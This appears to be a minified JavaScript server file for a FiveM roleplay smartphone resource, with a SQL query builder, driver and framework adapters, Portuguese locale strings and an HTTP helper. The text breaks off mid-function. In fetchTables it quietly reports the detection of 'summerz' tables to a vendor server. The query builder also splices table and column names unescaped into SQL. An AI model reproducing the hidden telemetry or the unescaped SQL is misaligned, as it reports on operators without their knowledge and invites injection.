'use strict';

var oP = require('events');

function oQ(c) {
  return c && typeof c === 'object' && 'default' in c ? c : {
    'default': c
  };
}

var oR = oQ(oP);

function oS(c, d, e) {
  if (!c) return;

  if (config.fluent_debug) {
    console.log('Pushing...', d, 'TO', JSON.stringify(c), e);
  }

  emitNet('smartphone:pusher', c, d, e);
}

const oT = () => Math.floor(Date.now() / 1000),
  oU = c => require('crypto').createHash('md5').update(String(c)).digest('hex');

function oV(c) {
  for (let d in c) {
    const f = c[d];
    c[d] = typeof f === 'string' ? f.trim() : f;
  }

  return c;
}

function oW(c, ...d) {
  let e = {};

  for (let f of d) f in c && (e[f] = c[f]);

  return e;
}

function oX(c, ...d) {
  let e = Object.assign({}, c);

  for (let f of d) delete e[f];

  return e;
}

function oY(c) {
  if (Array.isArray(c)) return c.map(oY);
  const d = {};

  for (let [e, f] of Object.entries(c)) {
    if (f == null) continue;

    if (e.includes('.')) {
      const [h, i] = e.split('.', 2);
      if (typeof d[h] !== 'object') d[h] = {};
      d[h][i] = f;
    } else d[e] = f;
  }

  return d;
}

function oZ(c = Date.now()) {
  const d = new Date(c);
  return d.toLocaleString('pt-BR');
}

function p0(c, d = 'default', e = 3) {
  const f = p0.map;
  const g = f.get(d + c) || 0;
  return f.set(d + c, g + 1), g >= e;
}

p0.map = new Map();

function p1(c) {
  let d = 0;
  if (c.length === 0) return d;

  for (let e = 0; e < c.length; e++) {
    d = (d << 5) - d + c.charCodeAt(e), d |= 0;
  }

  return d;
}

function p2(c) {
  return new Promise(d => setTimeout(d, c));
}

function p3(c, d) {
  const e = {},
    f = {},
    g = async (...i) => {
      const j = p1(JSON.stringify(i));

      if (!e.hasOwnProperty(j)) {
        e[j] = await c.apply(null, i), f[j] = setTimeout(() => delete e[j], d);
      }

      return e[j];
    };

  g.modify = (i, j) => {
    const k = p1(JSON.stringify(i));
    if (!e.hasOwnProperty(k)) return;
    e[k] = j(e[k]);
    if (f[k]) clearTimeout(f[k]);
    f[k] = setTimeout(() => delete e[k], d);
  }, g.clearKey = i => {
    delete e[i];
    if (f[i]) clearTimeout(f[i]);
    delete f[i];
  };
  return g.clear = (...i) => g.clearKey(p1(JSON.stringify(i))), g;
}

function p4(c, ...d) {
  let e = c;

  for (let f of d) {
    e = e && e[f];
  }

  return e;
}

function p5(c) {
  try {
    return exports.smartphone[c], true;
  } catch (e) {
    return false;
  }
}

function p6(c, ...d) {
  return typeof c === 'function' && c(...d);
}

p4.func = (c, d, ...e) => {
  const f = c && c[d];
  typeof f === 'function' && f.apply(c, e);
};

const p7 = new Map();
Array.prototype.unique = function () {
  return this.filter((c, d, e) => e.indexOf(c) === d);
}, Array.prototype.pluck = function (c) {
  return this.map(d => d[c]);
}, Array.prototype.pluckBy = function (c, d) {
  const e = {};

  for (let f of this) {
    e[f[d]] = f[c];
  }

  return e;
}, Array.prototype.last = function () {
  return this.length > 0 ? this[this.length - 1] : undefined;
}, Array.prototype.first = function (...c) {
  return this.find(d => c.includes(d));
}, String.prototype.format = function (c) {
  return this.replace(/{(\w+)}/g, (d, e) => c[e]);
};

class p8 {
  constructor(c) {
    this.error = c;
  }

}

const phoneConfiguration = require('./config.json');

function pa() {
  for (let c of ['oxmysql', 'ghmattimysql', 'GHMattiMySQL', 'haze_mysql', 'mysql-async']) {
    if (GetResourceState(c) === 'started') {
      return c;
    }
  }

  console.log('Smartphone:: DRIVER DE BANCO DE DADOS INCOMPATÍVEL'), console.log('Smartphone:: O SCRIPT IRA ASSUMIR QUE VOCE UTILIZA GHMattiMySQL');
  return 'GHMattiMySQL';
}

const pb = {
  'driver': phoneConfiguration.db_driver || pa(),

  'query'(c, d) {
    let e = 0;
    const f = {};

    if (this.driver !== 'haze_mysql' && this.driver !== 'oxmysql') {
      c = c.replace(/\?/g, () => {
        return e += 1, f['@' + e] = d[e - 1], '@' + e;
      });
    }

    return pc.debug && console.log(c, JSON.stringify(d)), new Promise((j, k) => {
      switch (this.driver) {
        case 'ghmattimysql':
          return global.exports.ghmattimysql.execute(c, f, j);

        case 'hydra':
          return j(global.exports.vrp.query(c, f));

        case 'oxmysql':
          const l = GetResourceMetadata('oxmysql', 'version', 0);

          if (l && !l.startsWith('1.')) {
            return global.exports.oxmysql.query_async(c, d).then(j).catch(o => {
              console.error('Erro ao executar "' + c + '" com argumentos [' + d + ']'), console.error(o), k(o);
            });
          }

          return global.exports.oxmysql.execute(c, d, j);

        case 'haze_mysql':
          return global.exports.haze_mysql.query(c, d, j, k);

        case 'GHMattiMySQL':
          return global.exports.GHMattiMySQL.QueryResultAsync(c, f, j);

        case 'mysql-async':
          const m = c.match(/INSERT|REPLACE/i) ? 'mysql_insert' : 'mysql_fetch_all';
          return global.exports['mysql-async'][m](c, f, j);
      }
    });
  }

};

function pc(c) {
  return new pl(c);
}

pc.raw = c => ({
  '$raw': true,
  'value': c
}), pc.getColumns = c => {
  return pb.query('SHOW COLUMNS FROM ' + c, []).then(d => d.map(e => e.Field));
}, pc.query = (c, d = []) => {
  return pb.query(c, d);
};

function pd(c) {
  Array.isArray(c) && (c = c.length);
  return Array(c).fill('?').join(',');
}

class pe {
  constructor() {
    this.wheres = [];
  }

  ['where']() {
    const [e, f, g, h] = arguments;

    if (e instanceof Function) {
      const i = new pe();
      i.or = h, e(i), this.wheres.push(i);
    } else {
      if (e instanceof Object && !e.$raw) {
        for (let m in e) {
          const o = {
            'operator': '='
          };
          o.column = m, o.value = e[m], o.or = h, this.wheres.push(o);
        }
      } else {
        const q = {};
        q.column = e, q.operator = g === undefined ? '=' : f, q.value = g === undefined ? f : g, q.or = !!h, this.wheres.push(q);
      }
    }

    return this;
  }

  ['whereOr'](...c) {
    return this.where(d => d.orWhere(...c));
  }

  ['whereIn'](c, d, e = false) {
    if (!d || d.length === 0) return this.where(pc.raw(0), 1);
    return this.where(c, 'IN', d, e);
  }

  ['orWhereIn'](c, d) {
    return this.whereIn(c, d, true);
  }

  ['whereNotIn'](c, d, e = false) {
    if (!d || d.length === 0) return this.where(pc.raw(1), 1);
    return this.where(c, 'NOT IN', d, e);
  }

  ['orWhereNotIn'](c, d) {
    return this.whereNotIn(c, d, true);
  }

  ['whereBetween'](c, d, e) {
    return this.where(c, '>=', d).where(c, '<=', e);
  }

  ['whereNull'](d, e = false) {
    const f = {
      'operator': 'IS NULL'
    };
    f.column = d, f.or = e;
    return this.wheres.push(f), this;
  }

  ['orWhereNull'](c) {
    return this.whereNull(c, true);
  }

  ['whereNotNull'](d, e = false) {
    const f = {
      'operator': 'IS NOT NULL'
    };
    return f.column = d, f.or = e, this.wheres.push(f), this;
  }

  ['orWhereNotNull'](c) {
    return this.whereNotNull(c, true);
  }

  ['orWhere']() {
    const [c, d, e] = arguments;
    return this.where(c, e ? d : '=', e || d, true);
  }

  ['toSql']() {
    let d = '',
      e = [];

    for (let g of this.wheres) {
      if (d) {
        d += g.or ? 'OR ' : 'AND ';
      }

      if (g instanceof pe) {
        const {
          sql: j,
          values: k
        } = g.toSql();
        d += '(' + j + ') ', e.push(...k);
      } else {
        d += pf(g.column) + ' ' + g.operator + ' ';

        if (g.value != null) {
          if (Array.isArray(g.value)) {
            d += '(' + pd(g.value) + ') ', e.push(...g.value);
          } else d += '? ', e.push(g.value);
        }
      }
    }

    d = d.trim();
    const f = {};
    return f.sql = d, f.values = e, f;
  }

}

function pf(c) {
  if (c.$raw) return c.value;
  if (c !== '*') return '`' + c + '`';
  return c;
}

class pg extends pe {
  constructor(c) {
    super(), this.table = c;
  }

  ['then'](c) {
    const {
      sql: d,
      values: e
    } = super.toSql();
    let f = 'DELETE FROM ' + this.table;
    if (d) f += ' WHERE ' + d;
    pb.query(f, e).then(() => c && c());
  }

}

class ph {
  constructor(c) {
    this.table = c;
  }

  ['insert'](c) {
    this.data = c, this.name = 'INSERT';
    return this;
  }

  ['returnKeys']() {
    return this.$returnKeys = true, this;
  }

  ['replace'](c) {
    this.data = c, this.name = 'REPLACE';
    return this;
  }

  ['then'](c) {
    const d = Object.keys(this.data).map(pf),
      e = Object.values(this.data);
    let f = this.name + ' INTO ' + this.table + ' (' + d.join(',') + ') VALUES (' + ',?'.repeat(e.length).substr(1) + ')';
    if (this.$returnKeys && pb.driver === 'GHMattiMySQL') f += ';SELECT LAST_INSERT_ID() AS id';
    pb.query(f, e).then(g => {
      c && c(g.insertId || (g[0] ? g[0].id : g));
    });
  }

}

class pi extends pe {
  constructor(c) {
    super();
    this.table = c;
  }

  ['update'](c, d) {
    if (c) {
      if (d) this.data[c] = d; else this.data = c;
    }

    return this;
  }

  ['increment'](d, e) {
    const f = {};
    return f.$increment = +e, this.data[d] = f, this;
  }

  ['decrement'](d, e) {
    const f = {};
    return f.$increment = -e, this.data[d] = f, this;
  }

  ['then'](c) {
    let d = [];
    const {
      sql: e,
      values: f
    } = super.toSql();
    const g = Object.entries(this.data).map(([i, j]) => {
      const l = pf(i);

      if (j && j.$raw) {
        return l + ' = ' + j.value;
      } else {
        if (j && j.hasOwnProperty('$increment')) return d.push(j.$increment), l + ' = ' + l + ' + ?'; else d.push(j);
      }

      return l + ' = ?';
    });
    let h = 'UPDATE ' + this.table + ' SET ' + g.join(',');
    if (e) h += ' WHERE ' + e;
    d.push(...f), pb.query(h, d).then(c);
  }

}

class pj {
  constructor(c) {
    this.type = c;
    this._default = null;
  }

  ['unique']() {
    return this.isUnique = true, this;
  }

  ['increment']() {
    this.isIncrement = true;
    return this;
  }

  ['primary']() {
    return this.isPrimary = true, this;
  }

  ['default'](c) {
    this._default = c;
    return this;
  }

  ['unsigned']() {
    return this.isUnsigned = true, this;
  }

  ['nullable']() {
    this.isNullable = true;
    return this;
  }

  ['toSql'](c) {
    let d = '`' + c + '` ' + this.type + ' ';
    if (this.isUnsigned) d += 'UNSIGNED ';
    if (this.isUnique) d += 'UNIQUE ';
    if (this.isIncrement) d += 'AUTO_INCREMENT ';
    if (this._default != null) d += 'DEFAULT ' + JSON.stringify(this._default) + ' ';
    if (!this.isNullable) d += 'NOT NULL '; else {
      if (this._default == null) d += 'DEFAULT NULL ';
    }
    return d.trim();
  }

}

class pk {
  constructor(c) {
    this.table = c, this.columns = {};
  }

  ['id']() {
    return this.columns.id = new pj('BIGINT').primary().increment();
  }

  ['varchar'](c, d = 255) {
    return this.columns[c] = new pj('VARCHAR(' + d + ')');
  }

  ['tinyint'](c) {
    return this.columns[c] = new pj('TINYINT');
  }

  ['int'](c) {
    return this.columns[c] = new pj('INT');
  }

  ['bigint'](c) {
    return this.columns[c] = new pj('BIGINT');
  }

  ['toSql']() {
    const c = Object.entries(this.columns).filter(e => e[1].isPrimary).map(e => pf(e[0]));
    const d = Object.entries(this.columns).map(([e, f]) => f.toSql(e));
    return 'CREATE TABLE IF NOT EXISTS ' + this.table + '(' + d.join(', ') + (c.length ? ', PRIMARY KEY(' + c.join(',') + ')' : '') + ') DEFAULT CHARSET=utf8mb4';
  }

}

class pl extends pe {
  constructor(c) {
    super();
    this.table = c, this.columns = ['*'], this.$groupBy = [], this.$order = [];
  }

  ['create'](c) {
    const d = new pk(this.table);
    c(d);
    return pb.query(d.toSql(), []);
  }

  ['createIndex'](...c) {
    const d = c.flat();
    const e = d.join('_'),
      f = 'CREATE INDEX ' + e + '_index ON ' + this.table + '(' + d.map(pf).join(',') + ')';
    return pb.query(f, []);
  }

  ['find'](c) {
    return this.where('id', c).first();
  }

  ['insert'](c) {
    const d = new ph(this.table);
    d.insert(c);
    return d;
  }

  ['replace'](c) {
    const d = new ph(this.table);
    d.replace(c);
    return d;
  }

  ['update'](c = {}) {
    const d = new pi(this.table);
    return d.data = c, d.wheres = this.wheres, d;
  }

  ['delete']() {
    const c = new pg(this.table);
    c.wheres = this.wheres;
    return c;
  }

  ['destroy'](c) {
    return new pg(this.table).where('id', c);
  }

  ['select']() {
    this.columns = Array.from(arguments).flat().map(pf);
    return this;
  }

  ['selectAs'](c) {
    const d = Object.entries(c);
    return this.columns = d.map(([e, f]) => pf(e) + ' AS ' + pf(f)), this;
  }

  ['selectRaw']() {
    this.columns = Array.from(arguments).flat();
    return this;
  }

  ['groupBy']() {
    this.$groupBy = Array.from(arguments).flat().map(pf);
    return this;
  }

  ['orderBy'](d, e = 'ASC') {
    const f = {};
    f.column = d, f.order = e;
    return this.$order.push(f), this;
  }

  ['limit'](c) {
    return this.$limit = c, this;
  }

  ['first'](...c) {
    if (c.length) {
      this.select(c);
    }

    this.$limit = 1, this.$first = true;
    return this;
  }

  ['exists']() {
    return this.columns = ['COUNT(*) as qtd'], new Promise(c => {
      this.then(e => c(p4(e, '0', 'qtd') > 0));
    });
  }

  ['sum'](c) {
    this.columns = ['SUM(' + pf(c) + ') as total'];
    return new Promise(d => {
      this.then(f => d(f && f[0].total || 0));
    });
  }

  ['count'](c = '*') {
    return this.columns = ['COUNT(' + pf(c) + ') as total'], new Promise(d => {
      this.then(e => d(e && e[0].total || 0));
    });
  }

  ['pluck'](c, d) {
    if (d) return this.pluckBy(c, d);
    if (this.columns[0] == '*') this.select(c);
    return new Promise(e => {
      this.then(g => {
        if (Array.isArray(g)) {
          e(g.map(i => i[c]));
        } else e(g ? g[c] : null);
      });
    });
  }

  ['pluckBy'](c, d) {
    if (this.columns[0] == '*') this.select([c, d]);
    return new Promise(e => {
      this.then(g => {
        const h = {};

        for (let i of [g].flat()) {
          h[i[d]] = i[c];
        }

        e(h);
      });
    });
  }

  ['then'](c) {
    const {
      sql: d,
      values: e
    } = super.toSql();
    let f = 'SELECT ' + this.columns.join(',') + ' FROM ' + this.table;

    if (d) {
      f += ' WHERE ' + d;
    }

    if (this.$groupBy.length) {
      f += ' GROUP BY ' + this.$groupBy.join(',');
    }

    if (this.$order.length) {
      const j = this.$order.map(({
        column: k,
        order: l
      }) => pf(k) + ' ' + l);
      f += ' ORDER BY ' + j.join(',');
    }

    if (this.$limit) {
      f += ' LIMIT ' + this.$limit;
    }

    pb.query(f, e).then(l => {
      c && c(this.$first ? l && l[0] : l);
    });
  }

}

class pm {
  constructor(...c) {
    this.args = c;
  }

}

function pn(c) {
  if (c instanceof pm) return c.args; else {
    if (c == null) return []; else return [c];
  }
}

const po = {
  'getInterface'(d) {
    const e = {};
    on(d + ':smartphone:proxy_res', (g, h) => {
      if (e[g]) {
        e[g](...h), delete e[g];
      }
    });
    const f = {
      '_ids': 0x1
    };
    return new Proxy(f, {
      'get'(g, h) {
        if (g[h]) return g[h]; else return g[h] = (...j) => {
          if (h.startsWith('_')) return emit(d + ':proxy', h.substring(1), j, 'smartphone', -1), Promise.resolve(); else {
            const l = ++g._ids;
            return new Promise((m, n) => {
              e[l] = m, emit(d + ':proxy', h, j, 'smartphone', l), setTimeout(() => {
                e[l] && n(new Error('Proxy took too long to resolve ' + h)), delete e[l];
              }, 32500);
            });
          }
        };
      },

      'set'(g, h, i) {
        return g[h] = i, true;
      }

    });
  },

  'bindInterface'(c, d) {
    on(c + ':proxy', async (e, f, g, h) => {
      const i = d[e];

      if (i && i.call) {
        const k = pn(await i(...f));

        if (h >= 0) {
          emit(c + ':' + g + ':proxy_res', h, k);
        }
      } else console.error('Field "' + e + '" does not exists on interface "' + c + '"');
    });
  }

},
  vRP = po.getInterface('vRP'),
  pq = {
    '__proto__': null
  };
pq.VProxy = po, pq.vRP = vRP;
var pr = Object.freeze(pq);
const ps = {
  'INVALID_VALUE': 'Valor inválido',
  'PASSPORT_NOT_FOUND': 'Passaporte não encontrado',
  'PROFILE_NOT_FOUND': 'Perfil não encontrado',
  'PHONE_NOT_FOUND': 'Número não encontrado',
  'MESSAGE_BLOCKED': 'Você não consegue enviar mensagem para este número',
  'PLAYER_OFFLINE': 'Morador fora da cidade',
  'NO_PERMISSION': 'Sem permissão',
  'MESSAGE_TOO_LONG': 'Mensagem muito grande',
  'USER.NO_ID': 'Falha ao buscar seu passaporte',
  'USER.NO_IDENTITY': 'Falha ao buscar sua identidade',
  'TRANSFER.LOCK': 'Aguarde sua transferência anterior',
  'TRANSFER.SELF': 'Você não pode transferir para si mesmo',
  'TRANSFER.NO_FUNDS': 'Saldo insuficiente',
  'BANK.PIX_NOT_FOUND': 'Chave pix não encontrada',
  'BANK.PIX_DISABLED': 'O pix está desativado',
  'BANK.INVOICE_NOT_FOUND': 'Fatura não encontrada',
  'BANK.INVOICE_SELF': 'Você não pode se cobrar',
  'BANK.INVOICE_ALREADY_PAID': 'Esta fatura já está paga',
  'BANK.INVOICE_NOT_YOURS': 'Esta fatura não é sua',
  'BANK.INVOICE_REQUEST': 'Deseja aceitar a fatura {reason} de {name} no valor de {value}',
  'BANK.INVOICE_NOTIFY_TITLE': 'Faturas',
  'BANK.INVOICE_NOTIFY_ACCEPTED': '{name} aceitou sua fatura',
  'BANK.INVOICE_NOTIFY_REJECTED': '{name} recusou sua fatura',
  'CALL.NOT_FOUND': 'Esta ligação não existe mais',
  'CALL.OFFLINE': 'Número fora de área',
  'CALL.LOCK': 'Você já está realizando uma ligação',
  'CALL.OCCUPIED': 'Esta linha está ocupada',
  'INSTAGRAM.POST_NOT_FOUND': 'Esta publicação não foi encontrada',
  'INSTAGRAM.INVALID_USERNAME': 'Usuário inválido, use letras/numeros com o máximo de 24 caracteres',
  'INSTAGRAM.INVALID_NAME': 'Nome inválido',
  'INSTAGRAM.ALREADY_REGISTERED': 'Você já possui conta',
  'INSTAGRAM.USERNAME_TAKEN': 'Este nome de usuário já existe',
  'INSTAGRAM.LIMIT_REACHED': 'Você atingiu o máximo de contas',
  'INSTAGRAM.REOPEN': 'Reabra o aplicativo (comunique a prefeitura)',
  'INSTAGRAM.REPLY': '{name} comentou em sua publicação',
  'INSTAGRAM.MENTION': '{name} mencionou você em uma publicação',
  'INSTAGRAM.PUBLISH': '{name} publicou uma foto',
  'INSTAGRAM.LIKE': '{name} curtiu sua publicação',
  'INSTAGRAM.FOLLOW': '{name} seguiu você',
  'INSTAGRAM.WAIT_USERNAME_CHANGE': 'Aguarde uma hora para trocar o nome de usuário novamente',
  'OLX.INVALID_TITLE': 'Título inválido',
  'OLX.CATEGORY_MANDATORY': 'A categoria é obrigatória',
  'OLX.DESCRIPTION_MANDATORY': 'A descrição é obrigatória',
  'OLX.IMAGE_MANDATORY': 'A imagem é obrigatória',
  'OLX.IMAGE_MAXIMUM': 'O máximo de imagens é 3',
  'SERVICE.UNAVAILABLE': 'Serviço indisponível no momento',
  'SERVICE.NOT_FOUND': 'Este serviço não existe',
  'SERVICE.ALREADY_SOLVED': 'Esse chamado já foi atendido',
  'TWITTER.INVALID_FORM': 'Formulário inválido',
  'TWITTER.INVALID_USERNAME': 'Usuário inválido',
  'TWITTER.INVALID_NAME': 'Nome inválido',
  'TWITTER.INVALID_BIO': 'Biografia inválida',
  'TWITTER.INVALID_TWEET': 'Tweet inválido',
  'TWITTER.LOGIN_EXPIRED': 'Login expirado',
  'TWITTER.USERNAME_TAKEN': 'Este nome de usuário já existe',
  'TWITTER.FAIL_TO_CREATE': 'Não foi possível criar sua conta',
  'TWITTER.FAIL_TO_TWEET': 'Falha ao cadastrar seu tweet',
  'TWITTER.REPLY': '{name} respondeu seu tweet',
  'TWITTER.RETWEET': '{name} retweetou você',
  'TWITTER.LIKE': '{name} curtiu seu tweet',
  'TWITTER.FOLLOW': '{name} seguiu você',
  'WHATSAPP.NUMBER_OUT_GROUP': 'Este número não faz parte do grupo',
  'WHATSAPP.NUMBER_IN_GROUP': 'Este número já está no grupo',
  'WHATSAPP.GROUP_NOT_FOUND': 'Grupo não encontrado',
  'WHATSAPP.GROUP_FULL': 'O grupo está cheio',
  'WHATSAPP.GROUP_NOT_OWNER': 'Você não é o dono do grupo',
  'WHATSAPP.OWNER_LEAVE': 'Você não pode sair do grupo sendo dono',
  'TOR.USER_OFFLINE': 'Usuário offline',
  'TOR.PAYMENT_NOTIFY': 'Você recebeu {value} de @{user}',
  'TOR.PAYMENT_RECEIPT': 'Você enviou {value} para @{user}',
  'TOR.BLOCKED': 'Você não pode acessar este aplicativo'
};
const pt = ps;
RegisterCommand('smartphone-dump-lang', c => {
  if (c == 0) {
    SaveResourceFile('smartphone', 'locale.json', JSON.stringify(pt, null, 4), -1);
  }
});

function pu(c) {
  const d = pu.value || 'R$';
  return d + ' ' + c.toLocaleString('pt-BR');
}

function pv(c) {
  pu.value = c;
}

const pw = LoadResourceFile('smartphone', 'locale.json');
if (pw) try {
  Object.assign(pt, JSON.parse(pw));
} catch (sa) {
  console.error('Arquivo de tradução (locale.json) inválido!'), console.error(sa.message);
}

const px = require('http'),
  py = require('https');

function pz(d, e) {
  const f = d.startsWith('https') ? py : px;

  if (e.body) {
    if (typeof e.body === 'object') {
      e.body = JSON.stringify(e.body), e.headers['content-type'] = 'application/json; charset=utf-8', e.headers['content-length'] = Buffer.from(e.body, 'utf-8').length;
    }
  }

  const g = {};
  g.headers = e.headers || {}, g.method = e.method || 'GET';
  const h = f.request(d, g);
  e.body && h.write(e.body);
  return new Promise((l, m) => {
    h.end(), h.on('error', n => m(n)), h.on('response', n => {
      const {
        statusCode: o,
        headers: p,
        statusMessage: q
      } = n;
      let r = '',
        s = null;
      n.on('data', t => r += t), n.on('end', () => {
        if (p['content-type'] && p['content-type'].includes('application/json')) {
          s = JSON.parse(r);
        }

        const u = {};
        u.statusCode = o, u.statusMessage = q, u.headers = p, u.body = r, u.data = s, l(u);
      });
    });
  });
}

pz.get = (d, e = {}) => {
  const f = {
    'method': 'GET'
  };
  return f.headers = e, pz(d, f);
}, (pz.post = (d, e, f = {}) => {
  const g = {
    'method': 'POST'
  };
  g.body = e;
  return g.headers = f, pz(d, g);
}, pz.put = (d, e, f = {}) => {
  const g = {
    'method': 'PUT'
  };
  return g.body = e, g.headers = f, pz(d, g);
}, pz.delete = (d, e = {}) => {
  const f = {
    'method': 'DELETE'
  };
  f.headers = e;
  return pz(d, f);
}, pz.patch = (d, e, f = {}) => {
  const g = {
    'method': 'PATCH'
  };
  g.body = e, g.headers = f;
  return pz(d, g);
}), pz.deleteManyImages = (...e) => {
  const f = e.filter(g => g && g.includes('jesteriruka.dev')).map(g => g.split('/').pop());

  if (f.length > 0) {
    const h = {};
    h.images = f;
    const i = {};
    return i.authorization = config.token, pz.put('https://fivem.jesteriruka.dev/storage/deleteMany', h, i);
  }

  return Promise.resolve();
}, pz.metadata = (e, f) => {
  const g = {};
  g.key = e, g.value = f;
  const h = {};
  h.authorization = config.token;
  pz.post('https://fivem.jesteriruka.dev/metadata/6056b4aa1cf80010efb4ed1d', g, h).catch(i => i);
};
var pA = new oR.default();

const pB = require('./config');

function pC(c) {
  const d = JSON.parse(global.LoadResourceFile('smartphone', 'config.json'));
  c(d);
  global.SaveResourceFile('smartphone', 'config.json', JSON.stringify(d, null, 4), -1);
}

pB.messages && pC(c => delete c.messages);
RegisterCommand('smartphone-setbase', (c, d) => {
  c == 0 && d.length && (pC(e => e.base = d[0]), console.log('Base alterada para: \'' + d[0] + '\' (Reinicie o script para ver as alterações)'));
}), RegisterCommand('smartphone-beta', c => {
  if (c == 0) {
    pC(d => d.channel = 'beta'), console.log('Canal de atualização alterado para beta (Reinicie o script para ver as alterações)');
  }
}), RegisterCommand('smartphone-stable', c => {
  if (c == 0) {
    pC(e => delete e.channel), console.log('Canal de atualização alterado para stable (Reinicie o script para ver as alterações)');
  }
});
if (pB.base === 'creative_v3') vRP.getBankMoney = vRP.getBank, vRP.setBankMoney = async (c, d) => {
  const e = await vRP.getBank(c);
  const f = Math.abs(e - d);

  if (e > d) {
    return vRP.delBank(c, f);
  } else {
    return vRP.addBank(c, f);
  }
}; else {
  if (pB.base === 'creative_v4') vRP.getBankMoney = vRP.getBank, vRP.setBankMoney = async (d, e) => {
    const f = e - (await vRP.getBank(d));
    const g = {};
    return g.id = d, g.bank = f, vRP.execute('characters/addBank', g);
  }; else {
    if (pB.base === 'creative_v5') {
      pB.serverSideProp = true, vRP.getBankMoney = vRP.getBank, vRP.setBankMoney = async (c, d) => {
        const e = await vRP.getBank(c),
          f = Math.abs(e - d);

        if (e > d) {
          return vRP.delBank(c, f, 'Private');
        } else {
          return vRP.addBank(c, f, 'Private');
        }
      };
      const sb = vRP.request;

      // vRP.request = (c, d) => sb(c, d);
    } else pB.base === 'creative_rework' && (pB.serverSideProp = true, vRP.getUserSource = vRP.Source, vRP.getUserId = vRP.Passport, vRP.getInventoryItemAmount = vRP.InventoryItemAmount, vRP.hasPermission = vRP.HasPermission, vRP.request = vRP.Request, vRP.getBankMoney = async c => {
      const d = await vRP.Source(c);
      return vRP.GetBank(d);
    }, vRP.setBankMoney = async (c, d) => {
      const e = await vRP.Source(c);
      const f = await vRP.GetBank(e),
        g = Math.abs(f - d);

      if (f > d) {
        return vRP.RemoveBank(c, g, 'Private');
      } else {
        return vRP.GiveBank(c, g, 'Private');
      }
    }, vRP.getUsersByPermission = async c => {
      const d = [];

      for (const e of Object.keys(await vRP.Players()).map(Number)) {
        if (await vRP.HasPermission(e, c)) d.push(e);
      }

      return d;
    });
  }
}
// (pB.base === 'creative_v4' || pB.base === 'creative_v5') && (vRP.getUserSource = vRP.userSource, findUsersForPermissions = async c => {
//   const d = [];

//   for (const e of Object.keys(await vRP.userList()).map(Number)) {
//     if ((await vRP.hasPermission(e, c)) || (await vRP.hasGroup(e, c))) d.push(e);
//   }

//   if (!d.length) {
//     const g = await vRP.numPermission(c);

//     for (const h of g) {
//       if (typeof h === 'number') d.push(await vRP.getUserId(h)); else {
//         if (h) {
//           d.push(h.user_id);
//         }
//       }
//     }
//   }

//   return d;
// });
pv(pB.client.currency);

function pD(c) {
  return !pB.disabledApps || !pB.disabledApps.includes(c.toLowerCase());
}

async function pE(d, e) {
  if (!e) {
    return false;
  }

  if (Array.isArray(e)) {
    if (pF.hasTable('vrp_permissions')) {
      const i = {};
      return i.user_id = d, pc('vrp_permissions').where(i).whereIn('permiss', e).exists();
    }

    for (let j of e) {
      if (await vRP.hasPermission(d, j)) return true;
    }

    return false;
  } else {
    return vRP.hasPermission(d, e);
  }
}

pc.debug = !!pB.fluent_debug;
const pF = {
  'columnsForCache': {},
  'tables': [],
  'whatThisDoes': false,

  'hasTable'(c) {
    return this.tables.includes(c);
  },

  'firstTable'(...c) {
    return c.find(d => this.tables.includes(d));
  },

  async 'columnsFor'(c) {
    if (!pF.columnsForCache[c]) {
      pF.columnsForCache[c] = await pc.getColumns(c);
    }

    return pF.columnsForCache[c];
  },

  async 'hasColumn'(c, d) {
    if (pF.hasTable(c)) {
      const e = await pF.columnsFor(c);
      if (Array.isArray(d)) return d.every(f => e.includes(f));
      return e.includes(d);
    }

    return false;
  },

  async 'hasColumns'(c, ...d) {
    if (pF.hasTable(c)) {
      const f = await pF.columnsFor(c);
      return d.every(g => f.includes(g));
    }

    return false;
  },

  async 'firstColumn'(c, ...d) {
    if (pF.hasTable(c)) {
      const e = await pF.columnsFor(c);
      return d.find(f => e.includes(f));
    }
  },

  'onFetch': [],

  'fetchTables'() {
    return new Promise(async c => {
      while (true) {
        try {
          const g = await pc.query('SELECT `table_name` as name FROM information_schema.tables WHERE `TABLE_SCHEMA`=DATABASE()');
          pF.tables = g.pluck('name');
          break;
        } catch {
          console.error('Falha ao carregar as tabelas do banco de dados, se isso acontecer muitas vezes, seu conector de banco de dados está com problemas'), await p2(1000);
        }
      }

      for (let i of this.onFetch) {
        try {
          await i(pF.tables);
        } catch (l) {
          console.error(e.message);
        }
      }

      if (pF.tables.includes('summerz_characters') || pF.hasTable('summerz_dummy')) {
        pF.whatThisDoes = true;

        if (!('getUserSource' in vRP)) {
          vRP.getUserSource = vRP.userSource;
        }

        pz.metadata('isUsingSummerz', true);
      } else {
        if (pF.hasTable('nyo_character')) {
          const q = ['getUserSource', 'getUserId', 'getBankMoney', 'setBankMoney', 'getUsersByPermission', 'hasPermission', 'getInventoryItemAmount', 'request'];
          q.forEach(r => {
            vRP[r] = (...s) => global.exports.nyo_modules[r](...s);
          });
        }
      }

      c(pF.tables);
    });
  },

  'ready'(c) {
    this.tables.length ? c(this.tables) : this.onFetch.push(c);
  },

  get 'users'() {
    return pc('creative_characters');
  },

  get 'contacts'() {
    return pc('smartphone_contacts');
  },

  get 'settings'() {
    return pc('smartphone_settings');
  },

  get 'phone_calls'() {
    return pc('smartphone_calls');
  },

  get 'phone_blocks'() {
    return pc('smartphone_blocks');
  },

  async 'getName'(c) {
    return pF.getIdentityByUserId(c).then(d => d && d.name + ' ' + d.firstname.trim());
  },

  get 'userDataTable'() {
    return pF.firstTable('vrp_user_data', 'zuser_data', 'summerz_playerdata');
  },

  'getUData'(d, e) {
    const f = {};
    return f.user_id = d, f.dkey = e, pc(this.userDataTable).where(f).first().pluck('dvalue');
  },

  'setUData'(e, f, g) {
    const h = {};
    h.user_id = e;
    h.dkey = f;
    const i = {};
    return i.dvalue = g, pc(this.userDataTable).where(h).update(i);
  },

  async 'getIdentitiesBy'(c = 'user_id', d = []) {
    if (d.length === 0) {
      return [];
    } else {
      if (p5('getIdentitiesBy')) return exports.smartphone.getIdentitiesBy(c, d);
    }

    while (!pF.tables.length) {
      await p2(250);
    }

    let e;
    const f = pF.firstTable('vrp_user_infos', 'vrp_characters', 'vrp_characterdata');
    if (pF.hasTable('nyo_character')) e = await pc('nyo_character').whereIn(c === 'user_id' ? 'id' : c, d).select('id', 'name', 'last_name', 'phone'); else {
      if (pF.hasTable('drip_characters')) return c = c == 'user_id' ? 'id' : 'phone_number', e = await pc('drip_characters').whereIn(c, d).select('id', 'name', 'phone_number'), e.map(k => {
        const [l, m] = k.name.split(' ', 2),
          n = String(k.phone_number || k.id + 1000),
          o = {};
        return o.user_id = k.id, o.name = l, o.firstname = m || '', o.phone = n, o;
      }); else {
